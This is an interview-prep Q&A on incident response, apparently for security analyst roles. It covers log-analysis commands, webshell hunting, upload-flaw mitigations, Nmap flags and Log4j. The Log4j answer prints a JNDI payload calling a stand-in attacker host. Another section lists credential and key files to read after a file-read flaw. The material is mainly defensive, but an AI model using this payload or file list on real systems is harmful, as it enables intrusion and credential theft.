# Incident Response – Detail Questions

## Q: What is your approach for analysing data packets or logs, and what tools do you use?

**A:**

**Approach:**
- Use traffic monitoring devices (e.g., SkyEye) to inspect packets and analyse the `Host` header and website directory paths.
- Query threat intelligence platforms (e.g., ThreatBook) to check if the host is malicious.
- Use Wireshark for deep packet analysis.

**What to Look For:**
- Requested website paths, source/destination IP addresses, `Host` header, and packet payload.

**Tools:**
- Wireshark
- ThreatBook (threat intelligence)

---

## Q: Have you analysed logs for file uploads and command execution?

**A:**

- **File Uploads:** Look for functions that allow file uploads or text editing. Check for Base64 or URL encoding to verify malicious code.
- **System Logs:** Check for suspicious behaviour (e.g., bash reverse shell).
- **Application Logs:** Look for unusual website files (e.g., webshells).

---

## Q: What tools do you use for Windows log analysis?

**A:**
- Log Parser
- LogParser Lizard
- Event Log Explorer

---

## Q: What are some techniques for Linux log analysis?

**A:**

- **Identify IPs brute-forcing root:**
```bash
grep "Failed password for root" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more
```
- **Identify all brute-forcing IPs:**
```bash
grep "Failed password" /var/log/secure | grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" | uniq -c
```
- **Identify usernames being brute-forced:**
```bash
grep "Failed password" /var/log/secure | perl -e 'while($_=<>){ /for(.*?) from/; print"$1\n";}' | uniq -c | sort -nr
```
- **Identify successful logins:**
```bash
grep "Accepted " /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more
```
- **Get login details (date, user, IP):**
```bash
grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}'
```

- **Check for user additions (`useradd`):**
```bash
grep "useradd" /var/log/secure
```
- **Check for user deletions (`userdel`):**
```bash
grep "userdel" /var/log/secure
```
- **Check for `su` command usage:**
```bash
grep "su:" /var/log/secure
```
- **Check for `sudo` commands:**
```bash
grep "sudo:" /var/log/secure
```

---

## Q: How would you analyse a large log file?

**A:**

- **Signature Matching:** Use regular expressions to match known attack signatures.
- **Statistical Analysis:** Identify requests that appear significantly less often than the average.
- **Whitelist Approach:** Create a baseline of normal requests and flag anything outside it.
- **Machine Learning (HMM):** Automatically model normal behaviour and flag deviations.
- **Log Analysis Tools:** Use tools like LogForensics.

---

## Q: What are the log file locations and key events for Windows and Linux?

**A:**

**Windows Logs:**
- **System Log:** `%SystemRoot%\System32\Winevt\Logs\System.evtx`
- **Application Log:** `%SystemRoot%\System32\Winevt\Logs\Application.evtx`
- **Security Log:** `%SystemRoot%\System32\Winevt\Logs\Security.evtx`

**Linux Logs:**
- Default location: `/var/log/`
- Configuration: `/etc/rsyslog.conf`

**Common Middleware Configuration Paths:**
- Apache: `/etc/httpd/conf`
- Nginx: `/etc/nginx`
- IIS: `C:\Windows\System32\inetsrv\config\`

---

## Q: How do you investigate and remove in-memory webshells?

**A:**

**Java Memory Webshell Investigation:**
- **JSP Injection:** Check logs for suspicious JSP access requests.
- **Code Execution Vulnerabilities:** Check middleware `error.log` for error messages that could indicate injection time and method.
- **Framework Vulnerabilities:** Check if the business components are susceptible to known code execution or deserialisation vulnerabilities.
- **Servlet/Controller Types:** Check logs (if enabled) for the URL of the webshell; use the earliest access time to determine injection time.
- **Filter/Listener Types:** Look for unusual patterns: many 404 responses with parameters, many requests to different URLs with the same parameters, or non-existent pages returning HTTP 200.

---

## Q: How would you modify a web server port if it cannot be changed?

**A:**

- **Change Port:** Modify the middleware configuration file directly.
- **Workaround:** Use port mapping (port forwarding) or configure Nginx as a reverse proxy.

---

## Q: What files would you typically read if you have a file read vulnerability (Linux and Windows)?

**A:**

**General:**
- Web application configuration files (may contain database credentials).
- Web middleware configuration files (may contain admin credentials).
- System files.

**Linux:**
- `/etc/passwd`, `/etc/shadow` – user credentials.
- `/etc/hosts` – host information.
- `/root/.bashrc` – environment variables.
- `/root/.bash_history` – command history.
- `/root/.ssh/id_rsa` – SSH private keys.
- `/proc/*/cmdline` – process command lines.
- Database configuration files.
- Web logs (`access.log`, `error.log`).
- SSH logs (`/root/.ssh/authorized_keys`, `/etc/ssh/sshd_config`, `/var/log/secure`).
- Network scripts (`/etc/sysconfig/network-scripts/ifcfg-eth0`).
- Session files (`/var/lib/php/sess_*`).

**Windows:**
- `C:\boot.ini` – system version.
- `C:\Windows\System32\inetsrv\MetaBase.xml` – IIS configuration.
- `C:\Windows\repair\sam` – initial system passwords.
- `C:\Program Files\mysql\my.ini` – MySQL configuration.
- `C:\Program Files\mysql\data\mysql\user.MYD` – MySQL root credentials.
- `C:\Windows\php.ini` – PHP configuration.
- `C:\Windows\my.ini` – MySQL configuration.

---

## Q: How do you analyse proxied traffic?

**A:** Analyse HTTP headers such as `X-Forwarded-For` and `Referer` for useful information.

---

## Q: How do you convert between ports and processes on Windows?

**A:**

- **Port to Process:**
```cmd
netstat -ano | findstr "port"
tasklist | findstr "PID"
```

- **Process Location:** Use Task Manager → Process → Open File Location, or use WMIC.

- **Services to Ports:** Check `%SystemRoot%\System32\drivers\etc\services`.

---

## Q: What methods are used to view processes on Windows?

**A:**

- **msinfo32:** Start → Run → `msinfo32` → Software Environment → Running Tasks.
- **D-Shield Web Shell Scanner:** Check for processes without valid signatures.
- **Process Explorer:** Microsoft's advanced process management tool.

**What to Examine:**
- Processes without valid signatures.
- Processes without descriptions.
- Process owners.
- Process paths (verify legitimacy).
- Processes with abnormally high CPU or memory usage.

---

## Q: What is the principle behind file upload vulnerabilities?

**A:**

- **PHP:** Upload a backdoor script, bypass upload restrictions, and access the script to execute commands.
- **Java:** Upload a JSP file.
- **ASP/ASPX:** Similar to PHP.
- **Python:** Typically less susceptible due to the nature of the language.

---

## Q: What are the characteristics of file upload attacks?

**A:** Attackers target interfaces that allow file uploads. The application fails to validate file types properly, allowing arbitrary file uploads. The attacker then accesses the uploaded malicious script to gain control of the server.

---

## Q: How can file upload vulnerabilities be mitigated?

**A:**

- **Backend Validation:** Restrict file types using a whitelist.
- **File Renaming:** Randomly rename files on upload.
- **Image Processing:** Re-render images to strip malicious code.
- **Disable Execution:** Prevent execution in upload directories.
- **Use Object Storage:** Store files in object storage (e.g., OSS).

---

## Q: What Nmap commands are you familiar with?

**A:**

- `-sT` – TCP full connect scan (accurate but logged).
- `-sS` – SYN half-open scan (fast, less logging).
- `-sN` – Null scan (flags all zero; not for Windows).
- `-sF` – FIN scan (not for Windows).
- `-O` – OS version detection.
- `-sV` – Service version detection.
- `-A` – Comprehensive scan.

---

## Q: How do you mitigate brute-force attacks?

**A:**

- Use strong CAPTCHAs.
- Enforce strong password policies.
- Implement account lockouts after a set number of failed attempts.
- Regularly audit for weak passwords.

---

## Q: How do you mitigate SQL injection?

**A:**
- Filter user input.
- Use parameterised queries (PDO prepared statements).

---

## Q: If a host is performing lateral movement in the internal network, how would you respond?

**A:**

1. **Identify the Source:** Determine if it's a legitimate internal operation (e.g., automated scripts).
2. **Confirm Attack:** If not legitimate, correlate with security events, processes, and traffic.
3. **Isolate:** Find the host and initiate the incident response process (preparation, detection, containment, eradication, recovery, follow-up).
4. **Handover:** Delegate specific tasks to the on-site operations team.

---

## Q: What other situational awareness products have you used?

**A:** IPS, IDS, HIDS, and bastion host.

---

## Q: What command-line tools do you use most?

**A:** Xshell, Xftp, FinalShell.

---

## Q: Have you used ThreatBook?

**A:** Yes. ThreatBook is a threat intelligence platform that can check if an IP or domain is malicious. It also has a browser plugin for easy querying.

---

## Q: What are CORS and JSONP cross-origin requests?

**A:**

**Same-Origin Policy:** The browser restricts scripts from one origin from accessing resources from another origin (domain, protocol, or port).

**Cross-Origin Requests:** A mechanism to allow scripts to access resources from other origins.

**JSONP:**
- Uses the `<script>` tag to bypass the same-origin policy.
- Only supports GET requests.

**CORS:**
- A standardised mechanism using HTTP headers.
- Supports all request methods (GET, POST, PUT, DELETE, etc.).

**JSONP vs CORS:**
- JSONP has better browser support (including older browsers).
- JSONP is read-only (GET only); CORS supports all methods.
- JSONP sends one request; CORS sends two for complex requests.
- Use JSONP for legacy browser support; use CORS for full functionality.

---

## Q: What is statelessness and connectionless in HTTP?

**A:**

- **Connectionless:** Each request is a separate connection; the server closes the connection after the request is complete.
- **Stateless:** The protocol does not retain any state between requests.

---

## Q: What is a routing table?

**A:** A routing table is a data structure stored in a router or networked computer that contains routes to specific network destinations. The routing table builds the Routing Information Base (RIB). Routers have a routing table for route selection and a Forwarding Information Base (FIB) for packet forwarding.

---

## Q: What are some non-SQL databases?

**A:** Zookeeper, HBase, Redis, MongoDB, Couchbase, LevelDB.

---

## Q: What are some common OA systems?

**A:**
- **PHP:** Tongda OA, WeOffice Eoffice.
- **Java:** WeOffice OA/Cloud Bridge, Zhiyuan OA, Lanling OA, Yongyou OA.
- **ASP:** Qilai OA.

---

## Q: How do you mitigate horizontal privilege escalation?

**A:**

- **Horizontal Privilege Escalation:** Accessing resources belonging to users with the same privilege level.
- **Vertical Privilege Escalation:** Accessing resources belonging to users with higher privileges.

**Mitigation:** Use role-based access control (RBAC). For horizontal, use a cache-backed token to validate password reset operations.

---

## Q: How do you combat black/grey-market tools?

**A:**

- **Monitoring & Response:** Track black/grey-market tools to identify propagation paths and capture new variants.
- **Fingerprinting:** Build software fingerprints to enhance risk identification.
- **Information Sharing:** Share intelligence with other organisations.

---

## Q: How do you prevent web scraping?

**A:**

- Block IPs exceeding a threshold.
- Block sessions exceeding a threshold.
- Block user agents exceeding a threshold.
- Use a combination of these measures.

---

## Q: What commands find service ports on Linux?

**A:**
```bash
grep <port> /etc/services
```

Example: `grep 80 /etc/services`

---

## Q: How do you detect and respond to phishing emails?

**A:**

**Detection:**
- System alerts (e.g., abnormal logins).
- Employee reports.
- Anomalous behaviour detection.
- Email honeytraps.
- Threat intelligence feeds (e.g., ThreatBook, VirusTotal) to scan URLs.

**Response:**
- Block corporate access to phishing domains/IPs.
- Block the phishing email sender.
- Notify affected users.
- Delete the phishing emails from servers.
- Have users change passwords and scan for malware.
- Investigate and trace the attacker.

---

## Q: How do you distinguish between scanning traffic and manual attack traffic?

**A:**

**Scanning Traffic:**
- Large volume.
- Regular patterns (consistent intervals, similar payloads).

**Manual Traffic:**
- Smaller volume.
- Irregular intervals and payloads.

---

## Q: How do you handle an `.exe` file?

**A:**

1. Identify the source and destination.
2. Download the file (without executing it).
3. Submit to a sandbox (e.g., ThreatBook).
4. If malicious, use IDA to disassemble and gather attacker information.

---

## Q: What is SELinux on Linux?

**A:** SELinux is a security subsystem that controls access to files and processes.

**To Disable:** Use `setup` (graphical), or edit `/etc/sysconfig/selinux` and set `SELINUX=disabled`.

---

## Q: Where does `iptables` operate in the TCP/IP model?

**A:** The network layer.

---

## Q: What is the ELK stack for log analysis?

**A:**

- **Elasticsearch:** A distributed search and analytics engine for log storage.
- **Logstash:** Collects, filters, and ships logs.
- **Kibana:** Provides a web interface for visualising and analysing logs.

---

## Q: What is the Log4j vulnerability?

**A:** Log4j is a Java logging component. Attackers can inject a JNDI payload (e.g., `${jndi:ldap://attacker.com/evil}`) into log messages. Log4j will resolve this, fetch and execute arbitrary code from a remote server.

**Remediation:** Upgrade Log4j to the latest version and disable JNDI lookups if not required.
